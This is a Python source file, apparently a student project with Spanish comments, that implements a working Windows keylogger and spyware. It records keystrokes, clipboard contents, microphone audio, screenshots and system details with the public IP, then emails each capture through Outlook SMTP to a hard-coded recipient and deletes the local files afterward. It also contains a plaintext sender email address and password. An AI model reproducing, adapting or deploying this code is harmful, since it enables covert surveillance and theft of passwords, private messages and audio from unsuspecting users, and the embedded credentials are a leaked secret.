#Elaborado por Daniela Amu con ayuda de Andrés Arrieta 

import os
import socket
import platform
import time
import smtplib
import sounddevice as sd
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32clipboard
from multiprocessing import Process, freeze_support
import threading
from requests import get

# Variables de entorno
file_path = "C:\\Users\\danie\\Desktop\\KEYLOGGER\\Project"
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
email_address = "userattch2023@outlook.com"
password = "yihkwprettuxwxgw"
toaddr = "user.attch@gmail.com"
time_interval = 20  
number_of_screenshots = 3

# Funcionalidad de enviar email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp-mail.outlook.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Captura de información del ordenador
def computer_information():
    with open(file_path + "\\" + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address")
        f.write(" Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + "" + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address " + IPAddr + '\n')

# Captura portapapeles
def copy_clipboard():
    with open(file_path + "\\" + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")

# Captura micrófono 
def microphone():
    fs = 44100
    myrecording = sd.rec(int(time_interval * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + "\\" + audio_information, fs, myrecording)

# Captura de pantalla
def screenshot():
    for i in range(number_of_screenshots):
        time.sleep(time_interval / number_of_screenshots)
        im = ImageGrab.grab()
        im.save(file_path + "\\" + screenshot_information)
        send_email(screenshot_information, file_path + "\\" + screenshot_information, toaddr)
        os.remove(file_path + "\\" + screenshot_information)


# Keylogger
def write_to_file(key):
    with open(file_path + "\\" + keys_information, "a") as f:
        try:
            k = key.char  
        except AttributeError:
            k = str(key)
            if key == Key.space:
                k = " " 
            elif key == Key.enter:
                k = "\n"
            elif key == key.ctrl:
                k = "ctrl"
            elif key == key.backspace:
                k = ""
        f.write(k)

def on_press(key):
    if key == Key.esc:
        # Detener el keylogger cuando se presiona "esc"
        return False
    write_to_file(key)

# Iniciar los procesos
with Listener(on_press=on_press) as listener:
    # Funcionalidad en hilos
    threading.Thread(target=computer_information).start()
    threading.Thread(target=copy_clipboard).start()
    threading.Thread(target=microphone).start()
    threading.Thread(target=screenshot).start()

    time.sleep(time_interval)
    # Detener el keylogger
    listener.stop()

# Enviar email con los datos obtenidos
send_email(keys_information, file_path + "\\" + keys_information, toaddr)
send_email(system_information, file_path + "\\" + system_information, toaddr)
send_email(clipboard_information, file_path + "\\" + clipboard_information, toaddr)
send_email(audio_information, file_path + "\\" + audio_information, toaddr)


# Limpiar 
delete_files = [keys_information, system_information, clipboard_information, audio_information]
for file in delete_files:
    os.remove(file_path + "\\" + file)